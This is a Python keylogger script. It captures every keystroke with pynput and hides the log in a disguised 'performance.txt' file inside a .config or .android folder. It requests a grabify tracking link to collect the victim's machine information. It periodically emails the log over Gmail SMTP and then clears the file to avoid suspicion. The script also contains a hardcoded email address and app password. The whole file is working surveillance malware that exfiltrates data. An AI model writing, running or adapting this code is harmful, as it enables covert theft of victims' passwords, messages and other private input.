import os
import sys;
import smtplib; 
from email.mime.text import MIMEText;
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email import encoders
from typing import *;
from pynput.keyboard import Listener, Key
from requests import get;

HOMEPATH: str = ""
FILEPATH: str = ""
USERNAME: str = ""
KEYS: List[Key] = []
COUNT: int = 0

def main():
    makePath()  # Create the path for the files to be store
    victimInfo() # Get the victim info by making them request my grabify link

    # Keylogger process runs
    with Listener(on_press=keyPress) as listener:
        listener.join()

def keyPress(key: Key) -> None:
    """
    Function to deal with keys being pressed when listener captures them
    """
    global KEYS, COUNT

    KEYS.append(key)
    COUNT += 1
    if COUNT >= 1: # if we have more than one key in our KEYS array then we write
        COUNT = 0 # reset count
        writeKey(KEYS)
        KEYS = [] # reset KEYS array

def writeKey(keys: List[Key]) -> None:
    """ 
    This will write keys to a file that is created
    but checking what OS we are on to create the file accordingly
    the plan is to create the file in a folder that a normal
    person will not check in
    """
    global FILEPATH
    global EXISTS
    fileSize: int = 0;

    with open(FILEPATH, "a") as keyFile:
        for key in keys:
            k = str(key).replace("'", "") # Replace quotes that come with keys
            if k.find("space") > 0: # Check if it is a space character
                keyFile.write("\n")
            if k.find("Key") == -1: # Check if it is a special key
                keyFile.write(k)
        fileSize = os.path.getsize(FILEPATH) # Check the size of the file and when it gets to a certain size send email
        if (fileSize % 1000 == 0): # Check size to send email and wipe the current text file to not arise suspiscion
            clear()

def victimInfo() -> None:
    """
    Function to get the information of the victims computer
    by making them request my grabify link
    """
    get("https://grabify.link/ZB18Y2")

def makePath():
    global HOMEPATH
    global FILEPATH
    global USERNAME

    if os.name == "posix": # We are on a Linux or Mac sytem
        HOMEPATH = "/home/"  # Set Home Path that is usual for Mac and Linux
        try:
            USERNAME = os.getlogin() + "/" # We will try to get their username
            FILEPATH = searchFile(HOMEPATH + USERNAME, ".config") + "/performance.txt" # We will look for .config folder
            if FILEPATH is None: # .config was not found then we will make one
                try:
                    os.makedirs(HOMEPATH + USERNAME + ".config")
                    FILEPATH = HOMEPATH + USERNAME + ".config/performance.txt" # Set file path to in the directory that we created
                except OSError:
                    sys.exit(1)
        except Exception:
            sys.exit(1)
    elif os.name == "nt":
        HOMEPATH = "C:\\Users\\" # Set home path that is usual for Windows systems
        try:
            USERNAME = os.getlogin() + "\\" # We will attempt to get the username for the home directory
            FILEPATH = searchFile(HOMEPATH + USERNAME, ".android") # We are looking for the .android folder to store our info
            if FILEPATH is None: # .android folder was not found so we will create it
                try:
                    os.makedirs(HOMEPATH + USERNAME + ".android")
                    FILEPATH = HOMEPATH + USERNAME + ".android\\performance.txt" # Set file path to the directory in Local
                except OSError:
                    sys.exit(1)
            else:
                FILEPATH = FILEPATH + "\\performance.txt"
        except Exception:
            sys.exit(1)

def searchFile(start: str, target: str) -> Union[str, None]:
    """
    Function to search if a file or folder exists in order to check
    for the existence of the .config or .android folder to store keylogs
    """
    for root, dir, file in os.walk(start):  # Search every directory and file
        if target in file or target in dir:
            return os.path.join(root, target)
    return None

def sendEmail(filePath: str) -> None:
    """
    Send email with current text in the keylogger file
    """
    # Add Mail Configuration
    smtp_server: str = "smtp.gmail.com"
    smtp_port: int = 587
    smtp_username: str = "kevincisneros29@gmail.com"
    smtp_password: str = "vrjatronwbyjullq"

    # Email Content
    sender: str = "kevincisneros29@gmail.com"
    recipient: str = "kevincisneros29@duck.com"
    subject: str = "Gifts"
    body: str = ""

    # Create a multipart message
    message = MIMEMultipart()
    message['Subject'] = subject
    message['From'] = sender
    message['To'] = recipient

    # Add the email body
    message.attach(MIMEText(body, 'plain'))
    
    # Attach the file
    attachment = open(filePath, 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename={filePath}')
    message.attach(part)

    try:
        # Establish a connection to the SMTP server
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()

        # Login to email account
        server.login(smtp_username, smtp_password)

        # Send the email
        server.sendmail(sender, recipient, message.as_string())

    except Exception as e:
        print('An error occurred while sending the email:', str(e))
    finally:
        # Close the connection to the SMTP server
        server.quit()

def clear():
    """
    Function sends the text file as an email to personal email
    and then clears out the current keys in the text file to not arise suspicion
    """
    if (os.path.getsize(FILEPATH) % 1000 == 0):  # makes check again so that no empty email is sent
        sendEmail(FILEPATH)  # sends email to me
        with open(FILEPATH, "w") as keyFile:
            keyFile.truncate(0)  # clears the file so that it is blank

if __name__ == "__main__":
    main()